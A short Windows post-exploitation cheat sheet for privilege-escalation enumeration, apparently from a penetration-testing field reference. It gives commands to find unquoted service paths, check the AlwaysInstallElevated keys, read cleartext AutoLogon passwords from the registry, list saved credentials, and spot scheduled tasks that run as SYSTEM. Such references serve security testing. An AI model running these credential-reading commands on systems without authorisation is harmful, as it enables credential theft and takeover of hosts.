### PHASE B — PrivEsc enumeration

**Windows Post-Exploitation: Field Reference**

```cmd
:: Unquoted service paths (space in path + no quotes = hijack)
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /iv "c:\windows\\" | findstr /iv """
:: AlwaysInstallElevated (any .msi runs as SYSTEM if both keys = 1)
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: Stored AutoLogon creds (cleartext!)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
:: Saved creds you can reuse without knowing them
cmdkey /list
:: Scheduled tasks (look for writable scripts run by SYSTEM)
schtasks /query /fo LIST /v | findstr /i "TaskName Run As User Task To Run"
```
